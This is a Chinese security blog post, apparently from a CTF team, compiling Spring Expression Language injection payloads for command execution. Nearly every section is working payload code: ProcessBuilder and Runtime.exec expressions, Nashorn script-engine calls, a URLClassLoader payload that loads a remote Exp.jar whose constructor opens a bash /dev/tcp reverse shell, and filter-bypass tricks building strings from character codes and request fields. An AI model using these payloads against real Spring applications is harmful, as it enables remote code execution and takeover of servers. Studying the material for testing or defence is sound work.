  <entry>
    <title>spel注入研究</title>
    <link href="/2021/02/27/SpEL%E6%B3%A8%E5%85%A5%E7%A0%94%E7%A9%B6/"/>
    <url>/2021/02/27/SpEL%E6%B3%A8%E5%85%A5%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<p>本文首发于安全客:xxxxxxx</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>和队里师傅一起研究总结了一些SpEL注入命令执行的payload</p><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p><strong>EL</strong> 全称 <strong>Expression Language</strong>  是为了使JSP写起来更加简单。减少java代码，便于开发和维护。</p><p><strong>SpEL</strong> 全称 <strong>Spring Expression Language</strong> 就是用于spring的el表达式 ，功能 : 获取数据、执行运算、获取web开发常用对象、调用Java方法</p><h3 id="SpEL工作流程"><a href="#SpEL工作流程" class="headerlink" title="SpEL工作流程:"></a>SpEL工作流程:</h3><p> 1.新建解析器 2.解析表达式 3.加载变量 4.取值</p><h3 id="1-ProcessBuilder执行"><a href="#1-ProcessBuilder执行" class="headerlink" title="1. ProcessBuilder执行"></a>1. ProcessBuilder执行</h3><p>new实例执行</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()&#125;]]<br></code></pre></div></td></tr></table></figure><p>java.lang包下的类不需要加全限定类名</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()&#125;]]<br></code></pre></div></td></tr></table></figure><h4 id="2-RunTime类执行"><a href="#2-RunTime类执行" class="headerlink" title="2. RunTime类执行"></a>2. RunTime类执行</h4><p>全限定类名执行</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p>同理java.lang包下的类不需要加全限定类名</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(Runtime).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p>解释: 由于<code>RunTime类</code>使用了单例模式 ,获取对象的话不能直接通过构造方法获得,必须通过静态方法<code>getRuntime</code>来获得 , 其源码可参考下图 , 调用静态方法的话需要使用SpEL的<code>T()</code>操作符,<code>T()</code>操作符会返回一个object.</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnxyqx742gj30ja07iwi6.jpg" alt="image-20210224010602445"></p><h3 id="3-调用ScriptEngineManager"><a href="#3-调用ScriptEngineManager" class="headerlink" title="3. 调用ScriptEngineManager()"></a>3. 调用ScriptEngineManager()</h3><p>从<strong>ruilin</strong>师傅的文章学到还可以用js引擎(不知道能不能用颜文字啥的，暂时没实验成功，测试成的师傅可以分享下).</p><p>获取自己java版本所有引擎及的信息</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ScriptEngineManager manager = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory: factories)&#123;<br>                System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>                );<br>        &#125;<br> &#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>  Name: Oracle Nashorn<br>  Version: 1.8.0_261<br>  Language name: ECMAScript<br>  Language version: ECMA - 262 Edition 5.1<br>  Extensions: [js]<br>  Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]<br>  <strong>Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</strong></p></blockquote><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>getEngineByName的参数可以填<code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举三个例子:</p><p><code>nashorn</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p><code>javascript</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p><code>js</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny70wji40j30r909v40b.jpg" alt="image-20210224055228307"></p><h3 id="4-使用classLoader加载"><a href="#4-使用classLoader加载" class="headerlink" title="4.使用classLoader加载"></a>4.使用classLoader加载</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny3tnjrenj30fs04pt8s.jpg" alt="image-20210224040143681"></p><p>JVM 拥有多种ClassLoader,不同的 ClassLoader 会从不同的地方加载字节码文件,</p><p>即可以从不同的文件目录加载 , 也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。</p><p>几个重要的 ClassLoader : <code>BootstrapClassLoader</code>、<code>ExtensionClassLoader</code> 和<code>AppClassLoader</code>、<code>UrlClassLoader</code></p><p>构造会用到<code>AppClassLoader</code>和<code>UrlClassLoader</code></p><h4 id="a-UrlClassLoader执行"><a href="#a-UrlClassLoader执行" class="headerlink" title="a). UrlClassLoader执行"></a>a). UrlClassLoader执行</h4><blockquote><p>  URLClassLoader 可以加载远程类库和本地路径的类库</p></blockquote><p>先构造一份Exp.jar</p><p><strong>Exp示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exp</span><span class="hljs-params">(String address)</span></span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        ProcessBuilder p = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="hljs-string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在Exp.jar目录起一个http <code>python -m SimpleHTTPServer 8990</code></p><p>反弹shell</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> java.net.URLClassLoader(<span class="hljs-keyword">new</span> java.net.URL[]&#123;<span class="hljs-keyword">new</span> java.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny34cdvpij30no08q3ze.jpg" alt="image-20210224033722685"></p><h4 id="b-AppClassLoader"><a href="#b-AppClassLoader" class="headerlink" title="b). AppClassLoader"></a>b). AppClassLoader</h4><blockquote><p>  AppClassLoader 直接面向用户,它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录,由于双亲委派的存在,它可以加载到许多有趣的类</p></blockquote><p>获取它可以通过<code>ClassLoader</code>的静态方法<code>getSystemClassLoader()</code>即<code>T(ClassLoader).getSystemClassLoader()</code></p><ul><li><p>加载Runtime执行</p><p>  由于需要调用到静态方法所以还是要用到<code>T()</code>操作</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure></li><li><p>加载ProcessBuilder执行</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructors()[<span class="hljs-number">1</span>].newInstance(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()&#125;]]<br></code></pre></div></td></tr></table></figure></li><li><p>通过其他类获取AppClassLoader</p><p>  这些类可以是maven项目中加载进来的类，也可以是项目中自定义类，举例三种:</p><p>  注意 : spel用于spring一般一定存在<strong>org.springframework</strong></p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">T(org.springframework.expression.Expression).getClass().getClassLoader()<br>T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()<br>T(com.ctf.controller.Demo)..getClass().getClassLoader()<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="5-StringBypass"><a href="#5-StringBypass" class="headerlink" title="5. StringBypass"></a>5. StringBypass</h3><p>假设明文过滤了某些类可以使用一些方法来绕过</p><ul><li><p><code>T(类名).getName()</code>会返回字符串类型的全限定类名</p><p>  所以<code>[[$&#123;T(String).getName()&#125;]]</code>结果为java.lang.String</p><p>  我们可以使用角标来构造我们想要的字符串</p>  <figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">51</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">122</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">49</span>)&#125;]]<br>#回显h3zh1<br></code></pre></div></td></tr></table></figure><p>  <img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny5ualhsej30mt04yt91.jpg" alt="image-20210224051129248"></p></li><li><p>使用Character类构造字符串</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;T(Character).toString(<span class="hljs-number">104</span>)+T(Character).toString(<span class="hljs-number">51</span>)+T(Character).toString(<span class="hljs-number">122</span>)+T(Character).toString(<span class="hljs-number">104</span>)+T(Character).toString(<span class="hljs-number">49</span>)&#125;]]<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="6-Controllable-Parameter-Bypass"><a href="#6-Controllable-Parameter-Bypass" class="headerlink" title="6.Controllable Parameter Bypass"></a>6.Controllable Parameter Bypass</h3><p>通过web请求构造字符串</p><ul><li><p>post</p>  <figure class="highlight vbscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbscript">[[$&#123;#<span class="hljs-built_in">request</span>.getMethod().<span class="hljs-keyword">sub</span><span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%<span class="hljs-number">2</span>b#<span class="hljs-built_in">request</span>.getMethod().<span class="hljs-keyword">sub</span><span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-number">80</span>,<span class="hljs-number">51</span>)%<span class="hljs-number">2</span>b#<span class="hljs-built_in">request</span>.getMethod().<span class="hljs-keyword">sub</span><span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-number">80</span>,<span class="hljs-number">122</span>)%<span class="hljs-number">2</span>b#<span class="hljs-built_in">request</span>.getMethod().<span class="hljs-keyword">sub</span><span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%<span class="hljs-number">2</span>b#<span class="hljs-built_in">request</span>.getMethod().<span class="hljs-keyword">sub</span><span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-number">80</span>,<span class="hljs-number">49</span>)&#125;]]<br></code></pre></div></td></tr></table></figure></li><li><p>get方法</p>  <figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,51)%2b#request.getMethod().substring(0,1).replace(71,122)%2b#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,49)&#125;]]<br></code></pre></div></td></tr></table></figure></li><li><p>cookie绕过</p><p>  <code>[[$&#123;#request.getRequestedSessionId()&#125;]]</code></p><p>  ​    <img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny6w7vqwyj30o201yt8s.jpg" alt="image-20210224054758847"></p></li><li><p>  还有很多可用此处，不再一一列举</p></li></ul><p><strong>参考 :</strong></p><p>Ruilin 由浅入深SpEL表达式注入漏洞 : <a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>EL : <a href="https://www.runoob.com/jsp/jsp-expression-language.html">https://www.runoob.com/jsp/jsp-expression-language.html</a></p><p>SpEL : <a href="https://www.imangodoc.com/50693.html">https://www.imangodoc.com/50693.html</a></p>]]></content>
    
    
    
